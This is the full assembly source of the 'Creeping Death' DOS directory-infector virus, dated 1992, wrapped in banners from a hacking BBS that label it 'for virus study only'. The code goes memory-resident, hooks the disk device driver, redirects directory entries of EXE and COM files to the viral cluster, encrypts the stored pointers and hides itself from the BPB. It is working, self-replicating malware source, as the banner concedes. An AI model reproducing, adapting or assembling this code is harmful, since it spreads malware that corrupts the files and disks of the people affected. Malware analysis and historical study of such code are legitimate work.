;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]   CoSysOp: Northstar Ken   [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;*****************************************************************************;
;                                                                             ;
; Creeping Death V (Encrypting, try to find it)                               ;
;                  (Version 4 bug Fixed)                                      :
; (c) Copyright 1992 by Bit Addict                                            ;
;                                                                             ;
;*****************************************************************************;

code segment public 'code'
		assume	cs:code, ds:code, es:code
		org	5ch

;*****************************************************************************;
;                                                                             ;
; Data                                                                        ;
;                                                                             ;
;*****************************************************************************;

BPB_Buf:	db	32 dup(?)		; buffer for BPB
EncryptWrite2:	db	36 dup(?)		; Encrypt DoRequest Encrypt

Request		equ	this dword		; address of the request header
RequestOffset	dw	?
RequestSegment	dw	?

	        org	100h

;*****************************************************************************;
;                                                                             ;
; Actual start of virus. In this part the virus initializes the stack and     ;
; adjusts the device driver used by dos to read and write from floppy's and   ;
; hard disks. Then it will start the orginal exe or com-file                  ;
;                                                                             ;
;*****************************************************************************;

Encrypt:	mov	si,offset Main-1
		mov	cx,400h-11
Repeat:		xor	byte ptr [si],0
		inc	si
		loop	Repeat

Main:		mov	sp,600h			; init stack
		inc	Counter

;*****************************************************************************;
;                                                                             ;
; Get dosversion, if the virus is running with dos 4+ then si will be 0 else  ;
; si will be -1                                                               ;
;                                                                             ;
;*****************************************************************************;

DosVersion:	mov	ah,30h			; fn 30h = Get Dosversion
		int	21h			; int 21h
		cmp	al,4			; major dosversion 
		sbb	di,di
		mov	byte ptr ds:drive[2],-1	; set 2nd operand of cmp ah,??

;*****************************************************************************;
;                                                                             ;
; Adjust the size of the codesegment, with dos function 4ah                   ;
;                                                                             ;
;*****************************************************************************;

		mov	bx,60h			; Adjust size of memory block
		mov	ah,4ah			; to 60 paragraphs = 600h bytes
		int	21h			; int 21h

		mov	ah,52h			; get internal list of lists
		int	21h			; int 21h

;*****************************************************************************;
;                                                                             ;
; If the virus code segment is located behind the dos config memory block the ;
; code segment will be part of the config memory block making it 61h          ;
; paragraphs larger. If the virus is not located next to the config memory    ;
; block the virus will set the owner to 8h (Dos system)                       ;
;                                                                             ;
;*****************************************************************************;

		mov	ax,es:[bx-2]		; segment of first MCB
		mov	dx,cs			; dx = MCB of the code segment
		dec	dx
NextMCB:	mov	ds,ax			; ax = segment next MCB
		add	ax,ds:[3]
		inc	ax
		cmp	ax,dx			; are they equal ?
		jne	NextMCB			; no, not 1st program executed
		cmp	word ptr ds:[1],8
		jne	NoBoot
		add	word ptr ds:[3],61h	; add 61h to size of block
NoBoot:		mov	ds,dx			; ds = segment of MCB
		mov	word ptr ds:[1],8	; owner = dos system

;*****************************************************************************;
;                                                                             ;
; The virus will search for the disk paramenter block for drive a: - c: in    ;
; order to find the device driver for these block devices. If any of these    ;
; blocks is found the virus will install its own device driver and set the    ;
; access flag to -1 to tell dos this device hasn't been accesed yet.          ;
;                                                                             ;
;*****************************************************************************;

		cld				; clear direction flag
		lds	bx,es:[bx]		; get pointer to first drive
						; paramenter block

Search:		cmp	bx,-1			; last block ?
		je	Last
		mov	ax,ds:[bx+di+15h]	; get segment of device header
		cmp	ax,70h			; dos device header ??
		jne	Next			; no, go to next device
		xchg	ax,cx
		mov	byte ptr ds:[bx+di+18h],-1 ; set access flag to "drive 
						; has not been accessed"
		mov	si,offset Header-4	; set address of new device
		xchg	si,ds:[bx+di+13h]	; and save old address
		mov	ds:[bx+di+15h],cs
Next:		lds	bx,ds:[bx+di+19h]	; next drive parameter block
		jmp	Search

;*****************************************************************************;
;                                                                             ;
; If the virus has failed in starting the orginal exe-file it will jump here. ;
;                                                                             ;
;*****************************************************************************;

Boot:		mov	ds,ds:[16h]		; es = parent PSP
		mov	bx,ds:[16h]		; bx = parent PSP of Parent PSP
		xor	si,si
		sub	bx,1
		jnb	Exec
		mov	ax,cs
		dec	ax
		mov	ds,ax
		mov	cx,8
		mov	si,8
		mov	di,0ffh
Count:		lodsb
		or	al,al
		loopne	Count
		not	cx
		and	cx,7
NextByte:	mov	si,8
		inc	di
		push	di
		push	cx
		rep	cmpsb
		pop	cx
		pop	di
		jne	NextByte
BeginName:	dec	di
		cmp	byte ptr es:[di-1],0
		jne	BeginName
		mov	si,di
		mov	bx,es
		jmp	short Exec

;*****************************************************************************;
;                                                                             ;
; If none of these devices is found it means the virus is already resident    ;
; and the virus wasn't able to start the orginal exe-file (the file is        ;
; corrupted by copying it without the virus memory resident). If the device   ;
; is found the information in the header is copied.                           ;
;                                                                             ;
;*****************************************************************************;

Last:		jcxz	Exit

;*****************************************************************************;
;                                                                             ;
; The information about the dos device driver is copyed to the virus code     ;
; segment                                                                     ;
;                                                                             ;
;*****************************************************************************;

		mov	ds,cx			; ds = segment of Device Driver
		add	si,4
		push	cs
		pop	es
		mov	di,offset Header
		movsw
		lodsw
		mov	es:StrBlock,ax
		mov	ax,offset Strategy
		stosw
		lodsw
		mov	es:IntBlock,ax
		mov	ax,offset Interrupt
		stosw
		movsb

;*****************************************************************************;
;                                                                             ;
; Deallocate the environment memory block and start the this file again, but  ;
; if the virus succeeds it will start the orginal exe-file.                   ;
;                                                                             ;
;*****************************************************************************;

		push	cs
		pop	ds
		mov	bx,ds:[2ch]		; environment segment
		or	bx,bx			; =0 ?
		jz	Boot
		mov	es,bx
		mov	ah,49h			; deallocate memory
		int	21h
		xor	ax,ax
		mov	di,1
Seek:		dec	di			; scan for end of environment
		scasw
		jne	Seek
		lea	si,ds:[di+2]		; es:si = start of filename
Exec:		push	bx
		push	cs
		pop	ds
		mov	bx,offset Param
		mov	ds:[bx+4],cs		; set segments in EPB
		mov	ds:[bx+8],cs
		mov	ds:[bx+12],cs
		pop	ds
		push	cs
		pop	es

		mov	di,offset f_name	; copy name of this file
		push	di
		mov	cx,40
		rep	movsw
		push	cs
		pop	ds

		mov	ah,3dh			; open file, this file will
		mov	dx,offset File		; not be found but the entire
		int	21h			; directory is searched and
		pop	dx			; infected

		mov	ax,4b00h		; execute file
		int	21h
Exit:		mov	ah,4dh			; get exit-code
		int	21h
		mov	ah,4ch			; terminate (al = exit code)
		int	21h

;*****************************************************************************;
;                                                                             ;
; Installation complete                                                       ;
;                                                                             ;
;*****************************************************************************;
;                                                                             ;
; The next part contains the device driver used by creeping death to infect   ;
; directory's                                                                 ;
;                                                                             ;
; The device driver uses only the strategy routine to handle the requests.    ;
; I don't know if this is because the virus will work better or the writer    ;
; of this virus didn't know how to do it right.                               ;
;                                                                             ;
;*****************************************************************************;


Strategy:	mov	cs:RequestOffset,bx
		mov	cs:RequestSegment,es
		retf

Interrupt:	push	ax			; driver strategy block
		push	bx
		push	cx			; save registers
		push	dx
		push	si
		push	di
		push	ds
		push	es

		les	bx,cs:Request
		push	es
		pop	ds
		mov	al,ds:[bx+2]		; Command Code

		cmp	al,4			; Input
		je	Input
		cmp	al,8			; Output
		je	Output
		cmp	al,9
		je	Output

		call	DoRequest

		cmp	al,2			; Build BPB
		jne	Return
		lds	si,ds:[bx+12h]		; copy the BPB and change it
		mov	di,offset bpb_buf	; into one that hides the virus
		mov	es:[bx+12h],di
		mov	es:[bx+14h],cs
		push	es			; copy
		push	cs
		pop	es
		mov	cx,16
		rep	movsw
		pop	es
		push	cs
		pop	ds
		mov	al,ds:[di+2-32]		; change
		cmp	al,2
		adc	al,0
		cbw
		cmp	word ptr ds:[di+8-32],0	; >32mb partition ?
		je	m32			; yes, jump to m32
		sub	ds:[di+8-32],ax		; <32mb partition
		jmp	short Return
m32:		sub	ds:[di+15h-32],ax	; >32mb partition
		sbb	word ptr ds:[di+17h-32],0
Return:		pop	es			; return to caller
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retf

Output:		mov	cx,0ff09h		; check if disk changed
		call	check
		jz	InfectSector		; no, just infect sector
		call	DoRequest		; yes, write virus to disk
		jmp	short inf_dsk

InfectSector:	jmp	_InfectSector		; infect sector
Read:		jmp	_Read			; read sector
ReadError:	add	sp,16			; error during request
		jmp	short Return

Input:		call	check			; check if disk changed
		jz	Read			; no, read sector
inf_dsk:	mov	byte ptr ds:[bx+2],4	; yes, write virus to disk
		cld				; save last part of request
		lea	si,ds:[bx+0eh]
		mov	cx,8
save:		lodsw
		push	ax
		loop	save
		mov	word ptr ds:[bx+14h],1	; read 1st sector on disk
		call	ReadSector
		jnz	ReadError
		mov	byte ptr ds:[bx+2],2	; build BPB
		call	DoRequest
		lds	si,ds:[bx+12h]		; ds:si = BPB
		mov	di,ds:[si+6]		; size of root directory
		add	di,15			; in sectors
		mov	cl,4
		shr	di,cl
		mov	al,ds:[si+5]
		cbw
		mov	dx,ds:[si+0bh]
		mul	dx			; ax=fat sectors, dx=0
		add	ax,ds:[si+3]
		add	di,ax
		push	di			; save it on stack
		mov	ax,ds:[si+8]		; total number of sectors
		cmp	ax,dx			; >32mb
		jnz	more			; no, skip next 2 instructions
		mov	ax,ds:[si+15h]		; get number of sectors
		mov	dx,ds:[si+17h]
more:		xor	cx,cx			; cx=0
		sub	ax,di			; dx:ax=number is data sectors
		sbb	dx,cx
		mov	cl,ds:[si+2]		; cx=sectors / cluster
		div	cx			; number of clusters on disk
		cmp	cl,2			; 1 sector/cluster ?
		sbb	ax,-1			; number of clusters (+1 or +2)
		push	ax			; save it on stack
		call	Convert			; get fat sector and offset in
		mov	byte ptr es:[bx+2],4	; sector
		mov	es:[bx+14h],ax
		call	ReadSector		; read fat sector
again:		lds	si,es:[bx+0eh]
		add	si,dx
		sub	dh,cl			; has something to do with the
		adc	dx,ax			; encryption of the pointers
		mov	word ptr cs:[gad+1],dx
		cmp	cl,1			; 1 sector / cluster
		jne	Ok
SmallModel:	not	di			; this is used when the
		and	ds:[si],di		; clusters are 1 sector long
		pop	ax
		push	ax
		inc	ax
		push	ax
		mov	dx,0fh
		test	di,dx
		jz	here
		inc	dx
		mul	dx
here:		or	ds:[si],ax
		pop	ax
		call	Convert
		mov	si,es:[bx+0eh]
		add	si,dx
Ok:		mov	ax,ds:[si]
		and	ax,di
		mov	dx,di			; allocate cluster
		dec	dx
		and	dx,di
		not	di
		and	ds:[si],di
		or	ds:[si],dx
		cmp	ax,dx			; cluster already allocated by
		pop	ax			; the virus ?
		pop	di
		mov	word ptr cs:[pointer+1],ax
		je	_Read_			; yes, don't write it and go on
		mov	dx,ds:[si]
		push	ds
		push	si
		mov	byte ptr es:[bx+2],8	; write
		call	DoRequest		; write the adjusted sector to
		pop	si			; disk
		pop	ds
		jnz	_Read_
		call	ReadSector		; read it again
		cmp	ds:[si],dx		; is it written correctly ?
		jne	_Read_			; no, can't infect disk
		dec	ax
		dec	ax			; calculate the sector number
		mul	cx			; to write the virus to
		add	ax,di
		adc	dx,0
		push	es
		pop	ds
		mov	word ptr ds:[bx+12h],2
		mov	ds:[bx+14h],ax		; store it in the request hdr
		test	dx,dx
		jz	less
		mov	word ptr ds:[bx+14h],-1
		mov	ds:[bx+1ah],ax
		mov	ds:[bx+1ch],dx
less:		mov	ds:[bx+10h],cs
		mov	ds:[bx+0eh],100h
		mov	byte ptr es:[bx+2],8	; write it
		call	EncryptWrite1

_Read_:		mov	byte ptr ds:[bx+2],4	; restore this byte
		std				; restore other part of the
		lea	di,ds:[bx+1ch]		; request
		mov	cx,8
load:		pop	ax
		stosw
		loop	load
_Read:		call	DoRequest		; do request

		mov	cx,9
_InfectSector:	mov	di,es:[bx+12h]		; get number of sectors read
		lds	si,es:[bx+0eh]		; get address of data
		sal	di,cl			; calculate end of buffer
		xor	cl,cl
		add	di,si
		xor	dl,dl
		push	ds			; infect the sector
		push	si
		call	find
		jcxz	no_inf			; write sector ?
		mov	al,8
		xchg	al,es:[bx+2]		; save command byte
		call	DoRequest		; write sector
		mov	es:[bx+2],al		; restore command byte
		and	byte ptr es:[bx+4],07fh
no_inf:		pop	si
		pop	ds
		inc	dx			; disinfect sector in memory
		call	find
		jmp	Return			; return to caller

;*****************************************************************************;
;                                                                             ;
; Subroutines                                                                 ;
;                                                                             ;
;*****************************************************************************;

find:		mov	ax,ds:[si+8]		; (dis)infect sector in memory
		cmp	ax,"XE"			; check for .exe
		jne	com
		cmp	ds:[si+10],al
		je	found
com:		cmp	ax,"OC"			; check for .com
		jne	go_on
		cmp	byte ptr ds:[si+10],"M"
		jne	go_on
found:		test	word ptr ds:[si+1eh],0ffc0h ; file to big
		jnz	go_on			    ; more than 4mb
		test	word ptr ds:[si+1dh],03ff8h ; file to small
		jz	go_on			    ; less than  2048 bytes
		test	byte ptr ds:[si+0bh],1ch    ; directory, system or
		jnz	go_on			    ; volume label
		test	dl,dl			; infect or disinfect ?
		jnz	rest
pointer:	mov	ax,1234h		; ax = viral cluster
		cmp	ax,ds:[si+1ah]		; file already infected ?
		je	go_on			; yes, go on
		xchg	ax,ds:[si+1ah]		; exchange pointers
gad:		xor	ax,1234h		; encryption
		mov	ds:[si+14h],ax		; store it on another place
		loop	go_on			; change cx and go on
rest:		xor	ax,ax			; ax = 0
		xchg	ax,ds:[si+14h]		; get pointer
		xor	ax,word ptr cs:[gad+1]	; Encrypt
		mov	ds:[si+1ah],ax		; store it on the right place
go_on:		rol	word ptr cs:[gad+1],1	; change encryption
		add	si,32			; next directory entry
		cmp	di,si			; end of buffer ?
		jne	find			; no, do it again
		ret				; return

check:		mov	ah,ds:[bx+1]			; get number of unit
drive:		cmp	ah,-1				; same as last call ?
		mov	byte ptr cs:[drive+2],ah	; set 2nd parameter
		jne	changed
		push	ds:[bx+0eh]			; save word
		mov	byte ptr ds:[bx+2],1		; disk changed ?
		call	DoRequest
		cmp	byte ptr ds:[bx+0eh],1		; 1=Yes
		pop	ds:[bx+0eh]			; restore word
		mov	ds:[bx+2],al			; restore command
changed:	ret					; return

ReadSector:	mov	word ptr es:[bx+12h],1		; read sector from disk

DoRequest:	db	09ah			; call 70:?, orginal strategy
StrBlock	dw	?,70h
		db	09ah			; call 70:?, orginal interrupt
IntBlock	dw	?,70h
		test	byte ptr es:[bx+4],80h	; error ? yes, zf = 0
		ret				; return

Convert:	cmp	ax,0ff0h		; convert cluster number into
		jae	fat_16			; an sector number and offset
		mov	si,3			; into this sector containing
		xor	word ptr cs:[si+gad-1],si	; the fat-item of this
		mul	si				; cluster
		shr	ax,1
		mov	di,0fffh
		jnc	cont
		mov	di,0fff0h
		jmp	short cont
fat_16:		mov	si,2
		mul	si
		mov	di,0ffffh
cont:		mov	si,512
		div	si
		inc	ax
		ret

EncryptWrite1:	push	ds
		push	cs
		pop	ds
		push	es
		push	cs
		pop	es
		cld
		mov	cx,12
		mov	si,offset Encrypt
		mov	di,offset EncryptWrite2
		inc	byte ptr ds:[si+8]
		rep	movsb
		mov	cl,10
		mov	si,offset DoRequest
		rep	movsb
		mov	cl,12
		mov	si,offset Encrypt
		rep	movsb
		mov	ax,0c31fh
		stosw
		pop	es
		jmp	EncryptWrite2

;*****************************************************************************;
;                                                                             ;
; Data                                                                        ;
;                                                                             ;
;*****************************************************************************;

File:		db	"C:",255,0		; the virus tries to open this
						; file

Counter		dw	0			; this will count the number of
						; systems that are infected by
						; this virus

Param:		dw	0,80h,?,5ch,?,6ch,?	; parameters for the
						; exec-function

Signature	db	'CREEPING DEATH 3'	; Signature

Header		db	7 dup(?)		; this is the header for the
						; device driver

f_name:		db	?			; Buffer for the filename used
						; by the exec-function

;*****************************************************************************;
;                                                                             ;
; The End                                                                     ;
;                                                                             ;
;*****************************************************************************;

code ends

end Encrypt

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]   CoSysOp: Northstar Ken   [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;
;컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴컴;
;컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;

